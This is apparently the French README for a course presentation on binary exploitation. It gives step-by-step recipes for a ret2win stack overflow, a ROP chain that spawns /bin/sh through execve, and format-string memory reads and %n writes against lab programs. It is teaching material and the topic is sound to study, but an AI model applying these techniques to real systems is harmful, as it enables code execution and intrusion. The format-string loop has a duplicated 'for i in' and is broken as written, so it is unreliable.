# IF27
Fichiers et programmes de la présentation de IF27

**Ce document contient les fichiers et programmes pour réaliser les exploitattions vues dans la présentation et le rapport de IF27**

*Installation*
```
git clone https://github.com/arthubhub/IF27.git
cd docker
./dockerMake.sh
```



*Aide*

# Ret2win :

Trouver l'offset : 
- gdb ./programme
- disass fonction_vulnerable
- b *[adresse après gets()]
- run < A1A2A3A4 ...
- au breakpoint : info frame -> regarder saved eip et en déduire l'offset
Trouver l'adresse de win
- disass win -> prendre l'adresse de la première instruction
- echo -ne "OFFSET\xdd\xcc\xbb\xaa" | ./programme -> remplace saved eip par 0xaabbccdd

# ROPchain :
- trouver les gadgets : ROPgadget --binary ./programme | grep "pop ..x .*; ret"
- mettre /bin/sh à une adresse connue :
pop ebx ; ret
ebx = 0xffffa004
pop eax ; ret
eax = 0x0068732f
mov dword ptr [ebx], eax ; ret

## Le cas de execve :
- execve(”/bin/sh”,0,0)
- le numéro du syscall doit etre dans eax
- x86_32
    - eax=0xB
    - ebx=@ de “/bin/sh”
    - ecx=0
    - edx=0
- x86_64
    - rax=59
    - rdi=@ de “/bin/sh”
    - rsi=0
    - rdx=0

# Format string 

## Lire partout
```
#!/bin/sh
for i in for i in $(seq 1 2000)
do
   echo "%${i}\$s" | ./vuln_format_string | grep "Result of" | strings >> results
done
```
## Écrire où on veut

Pour finir, la chaine de formatage %n nous permet d’écrire. Elle écrit le nombre de caractères affichés jusque là, mais où?. Elle les écrit dans l’adresse qu’on lui donne, en argument. 
Par exemple : 

- `printf(”54321%n”,&i); //écrit 5 dans i`
- `printf(”ab54321%3$n”,&a,&b,&c); //écrit 7 dans c`

Donc ce qu’on peut faire, c’est envoyer une chaine de formatage comme “a1b2%x%x%x…”, compter le nombre de %x jusqu’à atteindre “a1b2”, puis remplacer ce %x par un %n. On écrit alors une valeur à l’adresse “a1b2”. On peut changer la valeur écrite en ajustant le nombre de caractères imprimés en modifiant un %x → %0Nx, par exemple %0134x. Il ne reste plus qu’à remplacer “a1b2” par l’adresse voulue ( \x78\x56\x34\x12 pour l’adresse 12345678 ).

Des options plus avancées sont “a1b2%Ax%B$n”. Cette chaine imprime 4+A dans l’argument numéro B+1.

